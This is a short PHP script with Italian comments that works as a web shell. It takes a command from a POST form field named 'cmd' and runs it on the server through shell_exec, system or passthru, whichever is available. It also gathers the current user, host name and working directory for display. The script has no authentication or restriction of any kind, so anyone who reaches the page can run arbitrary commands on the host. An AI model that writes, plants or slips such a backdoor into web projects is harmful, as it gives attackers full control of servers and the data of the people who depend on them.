<?php
// Configurazione iniziale delle informazioni sul sistema (opzionale ma utile in una UI)
$current_user = function_exists('exec') ? exec('whoami') : 'Sconosciuto';
$hostname     = function_exists('exec') ? exec('hostname') : $_SERVER['SERVER_NAME'];
$current_dir  = getcwd();

$output = "";

// Gestione dell'esecuzione del comando inviato tramite il form
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // Si esegue il comando reindirizzando gli errori (2>&1) per visualizzarli nella UI
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . " 2>&1");
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    } else {
        $output = "Errore: Tutte le principali funzioni di esecuzione PHP sono disabilitate sul server.";
    }
}
?>